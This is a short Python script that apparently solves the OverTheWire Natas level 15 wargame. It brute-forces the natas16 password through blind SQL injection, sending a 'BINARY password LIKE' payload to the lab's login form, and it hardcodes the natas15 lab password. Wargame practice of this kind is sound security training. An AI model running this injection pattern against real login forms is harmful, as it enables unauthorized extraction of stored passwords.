import requests
import re
from html import unescape
from string import *

characters = ascii_lowercase + ascii_uppercase + digits

username = 'natas15'
password = 'TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'

url = 'http://%s.natas.labs.overthewire.org/index.php' % username

# List of password has been founded
seen_password = list()

with open('natas15.html', 'w+') as out:
    session = requests.Session()
    # res = session.get(url, auth=(username, password))
    # Bruteforce the password
    while (True):
        for ch in characters:
            print('trying character with password',
                  "".join(seen_password) + ch)

            # BINARY make after field that case sensitive.
            data = {
                'username': f'natas16" AND BINARY password LIKE "' + "".join(seen_password) + ch + '%" #'}
            res = session.post(
                url+'?debug=1', auth=(username, password), data=data)
            if ('user exists' in res.text):
                out.write(res.text)
                print(seen_password.append(ch))
                break
